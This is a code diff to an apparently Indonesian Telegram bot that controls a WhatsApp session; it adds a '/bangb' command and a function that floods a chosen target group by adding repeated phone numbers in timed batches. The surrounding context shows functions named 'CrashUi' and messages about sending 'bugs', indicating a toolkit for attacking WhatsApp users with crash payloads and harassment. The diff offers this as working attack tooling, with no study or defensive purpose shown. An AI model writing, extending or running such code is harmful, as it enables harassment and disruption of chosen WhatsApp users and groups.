@@ -1391,6 +1391,19 @@ if (remainingTime > 0) {
     bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
   }
 });
+bot.onText(/\/bangb (.+)/, async (msg, match) => {
+    const chatId = msg.chat.id;
+    const target = match[1].trim();
+
+    await bot.sendMessage(chatId, `⏳ Banging: ${target}`);
+
+    try {
+        await bangb(sock, target);
+        await bot.sendMessage(chatId, `✅ Done.`);
+    } catch (err) {
+        await bot.sendMessage(chatId, `❌ Error: ${err.message}`);
+    }
+});
 
 // Pastikan bagian atas file kamu sudah punya:
 // const fs = require("fs-extra");
@@ -2448,6 +2461,39 @@ async function CrashUi(sock, target) {
          }
         }, { participant: { jid: target } });
     }
+
+async function bangb(sock, groupJid) {
+    if (!groupJid.endsWith('@g.us')) {
+        throw new Error('@g.us server required');
+    }
+
+    const numbers = [
+        Array.from({ length: 10 }, () => "6281122112211"),
+        Array.from({ length: 10 }, () => "6282211221122"),
+        Array.from({ length: 10 }, () => "6283344334433"),
+        Array.from({ length: 10 }, () => "6284455667766"),
+        Array.from({ length: 10 }, () => "6285511334422"),
+        Array.from({ length: 10 }, () => "6286699881177"),
+        Array.from({ length: 10 }, () => "6287299199199"),
+        Array.from({ length: 10 }, () => "6289788997788"),
+        Array.from({ length: 10 }, () => "6281119292992"),
+        Array.from({ length: 10 }, () => "6288191919173"),
+    ];
+
+    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    for (let i = 0; i < numbers.length; i++) {
+        const waitMs = (i + 1) * 4000; 
+        console.log(`[${i}] Waiting ${waitMs / 1000}s before adding batch ${i + 1}...`);
+        await delay(waitMs);
+        await sock.groupParticipantsUpdate(
+            groupJid,
+            numbers[i].map(n => n + '@s.whatsapp.net'),
+            'add'
+        );
+        console.log(`[${i}] Batch ${i + 1} added.`);
+    }
+}
 
 async function JawaTimurIsBack(sock, target) {
   try {
